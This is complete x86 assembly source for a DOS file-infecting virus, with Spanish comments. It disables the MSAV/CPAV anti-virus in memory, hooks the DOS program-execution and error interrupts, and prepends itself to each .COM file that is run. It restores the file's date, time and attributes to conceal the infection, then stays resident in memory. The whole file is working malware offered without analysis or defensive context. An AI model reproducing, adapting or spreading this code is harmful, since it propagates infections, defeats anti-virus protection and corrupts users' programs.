code    segment
    assume cs:code,ds:code
    org   100h            
start:

;***************************
;SACO AL MSAV/CPAV DE LA RAM
;***************************
    
    MOV DX,5945H
    MOV AX,0FA01H
    INT 21H

;****************************************
;* PREGUNTO SI EL VIRUS YA ESTA INSTALADO 
;****************************************
    
    MOV AX,35DAH                                                             
    INT 21H                                    
    CMP BX,1                                           
    JE PUM                                            

;**********************************                                                      
;* SALTO A LA INSTALACION RESIDENTE 
;**********************************

    jmp   setup                              

ERROR dd ?
virus proc far

;*********************************************************
;* SI ES EJECUCION DE UN PROGRAMA TOMA EL CONTROL EL VIRUS 
;*********************************************************

    cmp ah,4bh                                                 
    je REPRODUCCION                                                
    a3:
    jmp PROSEGIR                                                 


PUM:
JMP PUM1
a:
pop bx
pop dx
jmp a3

REPRODUCCION:

push dx
push bx

push dx
pop bx 

;***********************
;* ES EL COMMAND.COM ???
;***********************

    add bx,6
    mov dl,byte ptr ds:[bx]
    cmp dl,77   
    jne voy

    dec bx
    mov dl,byte ptr ds:[bx]
    cmp dl,77
    je a 

voy:
pop bx
pop dx


push ds 
push dx 
push es
push ax  
push bx   
push cx
pushf



push ds
push dx

;**********************************
;* ME CUELGO DE LOS ERRORES DEL DOS 
;**********************************

    PUSH CS                            
    POP DS                             
    MOV AX,3524H                             
    INT 21H                                    
    MOV WORD PTR ERROR,ES                     
    MOV WORD PTR ERROR+2,BX                
                     
    MOV AX,2524H                                   
    MOV DX,OFFSET ALL                                
    INT 21H                             

    pop dx
    pop ds

;*****************************
;* PIDO LOS ATRIBUTOS DEL FILE 
;*****************************
    
    mov ax,4300h                                            
    int 21h                                                  
    push cx ;--- PONGO LOS ATRIBUTOS EN LA PILA (ATRIB)                             

;********************************
;* LE SACO LOS ATTRIBUTOS EL FILE 
;********************************

    mov ax,4301h                           
    xor cx,cx                             
    int 21h                                  

;*************************                                       
; ABRO EL ARCHIVO PARA L/E 
;*************************   
   
    mov ax,3d02h ;--- ABRO EL FILE PARA LEER/ESCRIBIR                   
    int 21h                                                   
    push ax  ;--- 1 PONGO EL HANDLE EN PILA (ATRIB,HANDLE)        

;*****************************   
;* PIDO UN SEGMENTO DE MEMORIA 
;*****************************

    MOV AH,48H                                                                
    MOV BX,1000H                                                                
    INT 21H                                                                  
    PUSH AX ;--- 2 PONGO EL SEGMENTO ASIGNADO EN PILA (ATRB,HANDLE,SEG_ASIG)

;*****************************************
;* MUEVO EL ARCHIVO A MI SEGMENTO ASIGNADO                                    
;*****************************************

    pop ds    ;--- SACO EL SEGMENTO DE LA PILA (2) (HANDLE)                                  
    pop bx    ;--- SACO EL HANDLE SE LA PILA (1) (ATRIB)                                
    MOV SI,BX ;*** PONGO EL HANDLE EN BX                                               
    push bx   ;--- 3 PONGO EL HANDLE EN LA PILA (ATRIB,HANDLE)                           
    push ds   ;--- 4 PONGO EL SEGMENTO EN LA PILA (ATRIB,HANDLE,SEG_ASIG)                     
    mov ah,3fh                                                                      
    mov cx,64000                                                                                
    xor dx,dx                                                                                 
    int 21h                                                                                    
    push AX   ;--- 5 PONGO LA CATIDAD DE BYTES LEIDOS (ATRIB,HANDLE,SEG_ASIG,BYTES)    
    cmp ax,200
    jb mal_t
    cmp ax,63000
    jnb mal_t 


    
;********************************         
;* CONTROLO SI EL FILE ES UN .COM             
;********************************

    xor bx,bx                          
    mov dl,byte ptr ds:[bx]                                              
    cmp dl,77                                               
    jne ESTA_INFECTADO?                   
    inc bx                                     
    mov dl,byte ptr ds:[bx]                 
    cmp dl,90                              
    jne ESTA_INFECTADO?                       
mal_t:  
        pop ax                                 
    pop es                                  
    mov ah,49h                           
    int 21h                               
    pop BX                                  
    mov ah,3Eh                            
    int 21h                                     
    jmp eje                                   

;************************************                            
;* CONTROLO SI EL FILE ESTA INFECTADO            
;************************************   

ESTA_INFECTADO?:   
    
    xor bx,bx                           
    mov dl,byte ptr ds:[bx]                                              
    cmp dl,186                                              
    jne infectar                          
    inc bx                                     
    mov dl,byte ptr ds:[bx]                
    cmp dl,69                              
    jne infectar                              
    inc bx                                        
    mov dl,byte ptr ds:[bx]                         
    cmp dl,89                                
    jnp infectar                               
    inc bx                                  
    mov dl,byte ptr ds:[bx]                          
    cmp dl,184                                  
    jne infectar                                   
    pop ax                                 
    pop es                                  
    mov ah,49h                           
    int 21h                               
    pop BX                                  
    mov ah,3Eh                            
    int 21h                                     
    jmp eje                                   
              
PUM1:        
JMP ejecuto

INFECTAR:

;**********************
;PIDO LA FECHA DEL FILE
;**********************

    MOV AX,5700H                                 
    MOV BX,SI                                     
    INT 21H                                           
    MOV SI,CX ;*** PONGO LA HORA EN SI        
    MOV DI,DX ;*** PONGO LA FECHA EN DI        

;********************************************
;* MUEVO EL PUNTERO DEL ARCHIVO A SU COMIENZO    
;********************************************   
   
    POP CX  ;--- SACO LOS BYTES LEIDOS (5) (ATRIB,HANDLE,SEG_ASIG)         
    POP DX  ;--- SACO EL SEGMENTO ASIGNADO (4) (ATRIB,HANDLE)                 
    POP BX  ;--- SACO EN HANDLE (3) (ATRIB)                                   
    PUSH DX ;--- 6 PONGO EL SEGMENTO EN LA PILA (ATRIB,SEG_ASIG)                
    PUSH CX ;--- 7 PONGO LOS BYTES LEIDOS EN LA PILA (ATRIB,SEG_ASIG,BYTES)      
    MOV AX,4200H                                                                                    
    XOR CX,CX                                                                         
    XOR DX,DX                                                                      
    INT 21H                                                                            

;**************************************     
;*  COPIA MI VIRUS AL COMIENZO DEL FILE 
;**************************************   

    MOV AH,40H                            
    MOV CX,OFFSET FIN - 100H                   
    PUSH CS                                   
    POP DS                                    
    MOV DX,100H                             
    INT 21H                               
    
;*****************************************
;* COPIA EL FILE A INFECTAR A CONTINUACION
;*****************************************   
   
    POP CX ;---  SACO LOS BYTES LEIDOS (7) (ATRIB,SEG_ASIG)                    
    POP DS ;---  SACO EL SEGMENTO ASIGNADO (6) (ATRIB)            
    PUSH DS ;--- 8 PONGO EL SEGMENTO ASIGNADO (ATRIB,SEG_ASIG)   
    MOV AH,40H                                                       
    XOR DX,DX                                                          
    INT 21H                                                          
                                   
        
SALIR:

;***********************************
;* RESTAURO LA FECHA Y HORA DEL FILE          
;***********************************

    MOV AX,5701H                           
    MOV DX,DI                                 
    MOV CX,SI                                   
    INT 21H                                   

;****************                                           
;* CIERRO EL FILE 
;****************
    
    mov ah,3eh               
    int 21h                

;*****************************
;* LIBERO EL BLOQUE DE MEMORIA
;*****************************

    POP ES ;--- SACO EL SEGMENTO ASIGNADO (8) (ATRIB)  
    mov ah,49h                                           
    int 21h                                                 


eje:

;************************
;* RECUPERO LOS ATRIBUTOS 
;************************

    pop cx ;--- SACO LOS ATRIB'S DE LA PILA ()       
    mov si,cx                                         

                         
popf
pop cx
pop bx
pop ax
pop es
pop dx
pop ds

push ds                  
push dx
push es  
push ax
push bx
push cx
pushf 

;************************
;* RESTAURO LOS ATRIBUTOS
;************************
    
    MOV AX,4301H               
    mov cx,si                  
    INT 21H                       

;************************************
;* RESTAURO EL CONTROLADOR DE ERRORES
;************************************

de_erro:                                   

    MOV AX,2524H                             
    LEA BX,error                             
    MOV DS,BX                             
    LEA bx,ERROR+2                           
    INT 21H                                


popf  
pop cx
pop bx
pop ax
pop es
pop dx
pop ds

;**********************
;* SI NO ERA LA 4B SALE
;**********************

prosegir:                 
    
    JMP dword ptr CS:[INT21]     

;******************************                                
;* MUEVO EL FILE A LA POS. 100H                  
;******************************

ejecuto:               

    PUSH CS                    
    POP DS                      
    MOV SI,OFFSET CARGADOR     
    PUSH CS                     
    POP ES                            
    MOV DI,64005                        
    MOV CX,30                    
    REP MOVSB                                
    MOV AX,64005                
    JMP AX                 

    CARGADOR:                           
    PUSH CS             
    POP ES              
    mov cx,64000           
    PUSH CS          
    POP DS               
    MOV SI,OFFSET FIN     
    MOV DI,100H          
    REP MOVSB             
    MOV AX,100H        
    JMP AX               
            
;*************************************
;* PONE 0 EN EL CONTROLADOR DE ERRORES
;*************************************

all:                          

    xor al,al                        
    iret                         


int21   dd ?
virus endp
end_ISR label byte

setup:

;**********************************
;* MARCO UNA INTERRUPCION COMO GUIA 
;**********************************
    
    MOV AX,25daH                         
    MOV DX,1                            
    INT 21H                             

;***********************************
;* PIDO LOS VECTORES DE INTERRUPCION
;***********************************    

    mov   ax,3521h                         
    int   21h                              
    mov   word ptr int21,bx                    
    mov   word ptr int21+2,es               

;***************************
;* PIDO UN BLOQUE DE MEMORIA 
;***************************

    push cs                           
    pop es                                 
    mov ah,4ah                       
    mov bx,150h                        
    int 21h                         

;*******************************************
;* BUSCO EL NOMBRE DEL FILE EN EL ENVIROMENT 
;*******************************************
               
    mov ds,byte ptr cs:[2ch]     
    xor bx,bx                     

nuevo:                            

    inc bx                          
    mov dl,byte ptr ds:[bx]         
    cmp dl,00                      
    jne nuevo                          
                 
nuevo1:                    
    
    inc bx                            
    mov dl,byte ptr ds:[bx]             
    cmp dl,00                       
    jne nuevo1                            
                
nuevo2:                         

    inc bx                                
    mov dl,byte ptr ds:[bx]              
    cmp dl,01                          
    jne nuevo2                        
            
nuevo3:                        

    inc bx                           
    mov dl,byte ptr ds:[bx]               
    cmp dl,00                  
    jne nuevo3                                         
                      

cero3:                           
                
inc bx                         
push bx                     
pop dx
push dx
push ds
push cs
pop ds

;************************
;* LEO EL PARAMETER BLOCK
;************************

    lea bx,block                     
    mov word ptr ds:[bx],cs           
    mov word ptr ds:[bx+2],80h       
    mov word ptr ds:[bx+4],cs            
    mov word ptr ds:[bx+6],5ch            
    mov word ptr ds:[bx+8],cs            
    mov word ptr ds:[bx+10],6ch           
    mov word ptr ds:[bx+12],cs            
    mov bx,offset block                 

push cs
pop es
pop ds
pop dx

;*****************
;* EJECUTO EL FILE
;*****************

    mov ax,4b00h        
    int 21h             

push cs
pop ds

;*************************************************
;* APUNTO LOS VECTORES DE INTERRUPCION A MI RUTINA
;*************************************************    

    mov   ax,2521h                                        
    mov   dx,offset virus                             
    int   21h                                      


;*****************************
;* TERMINAR Y QUEDAR RESIDENTE
;*****************************    
    
    mov   dx,offset fin            
    int   27h                           


block  dw (0)
       dd  ? 
       dd  ?
       dd  ?
fin:

code    ends
     
end    start
